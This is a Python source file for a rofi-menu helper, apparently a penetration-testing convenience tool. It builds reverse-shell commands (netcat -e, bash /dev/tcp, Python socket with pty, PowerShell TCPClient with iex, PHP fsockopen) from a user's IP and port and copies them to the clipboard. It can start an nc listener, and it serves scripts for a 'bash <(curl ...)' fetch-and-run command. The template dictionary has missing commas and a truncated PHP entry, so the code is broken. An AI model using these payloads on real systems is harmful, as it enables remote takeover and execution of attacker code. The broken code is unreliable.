#!/usr/bin/env python3

import clipboard
import dmenu
from os import listdir, system
from os.path import isfile, join, exists
from pathlib import Path
import rofi

home = str(Path.home())

r = rofi.Rofi()


# Helper Functions
getKeys = lambda dict: \
						dict.keys()
copy = lambda text: \
						clipboard.copy(text)
buildShellCommand = lambda reverseShellTemplate, ip, port, sh: \
						reverseShellTemplates[reverseShellTemplate].replace("(ip)", ip).replace("(port)", port).replace("(sh)", sh)

def buildPrompt(options, prompt):
		# rofi_args.append(f"{home}/.shlol/rofi_theme.rasi")
	if len(options) == 0:
		answer = r.text_entry(prompt, rofi_args=[])
		return answer
	else:
		index, key = r.select(prompt, options, rofi_args=[])
		return list(options)[index]

reverseShellTemplates = {
	"netcat": "nc (ip) (port) -e (sh)",
	"bash": "bash -i >& /dev/tcp/(ip)/(port) 0>&1",
	"python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"(ip)\",(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"(sh)\")'"
	"powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"(ip)\",(port));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
	"php": "php -r '$sock=fsockopen(\"(ip)\",(port));exec(\"/bin/bash -i <&3 >&3 2>&3\");" # Credits: http://github.com/rhergenreder/HackingScripts/
}

menu = buildPrompt([
	"Reverse Shell",
	"Run Remote Script (creates a web server)",
	"Exit"
], "Task")

if menu == "Reverse Shell":
	x = buildPrompt(getKeys(reverseShellTemplates), "What type of reverse shell do you want?")
	ip = buildPrompt([], "Type in your IP")
	port = buildPrompt([], "Type in your PORT (>1024 recommended)")

	copy(buildShellCommand(x, ip, port, "/bin/sh"))
	createListener = buildPrompt(["yes", "no"], "The reverse shell command has been copied to your clipboard. Do you want me to create a listener for you?( y/n )")

	if createListener == "yes":
		system(f"xterm -fa monaco -fs 13 -bg black -fg green -hold -e nc -nvlp {port}")	
elif menu == "Run Remote Script (creates a web server)":
	if not exists(f"{home}/.shlol/scripts"):
		buildPrompt([], "WARNING: ~/.shlol/scripts NOT FOUND! PLEASE CREATE IT AND PUT YOUR SCRIPTS IN IT")
	else:
		onlyfiles = [f for f in listdir(f"{home}/.shlol/scripts") if isfile(join(f"{home}/.shlol/scripts", f))]
		script = buildPrompt(onlyfiles, "What script do you want to serve?")
		ip = buildPrompt([], "What's your IP?")
		port = buildPrompt([], "What's your PORT (>1024 recommended)?")
		copy(f"bash <(curl -s http://{ip}:{port}/{script})")
		createServer = buildPrompt(["yes", "no"], "The command to run the file from your server has been copied. Do you want me to create a web server for you?( y/n )")
		if createServer == "yes":
			system(f"xterm -fa monaco -fs 13 -bg black -fg green -hold -e \"cd {home}/.shlol/scripts;python3 -m http.server {port}\"")	
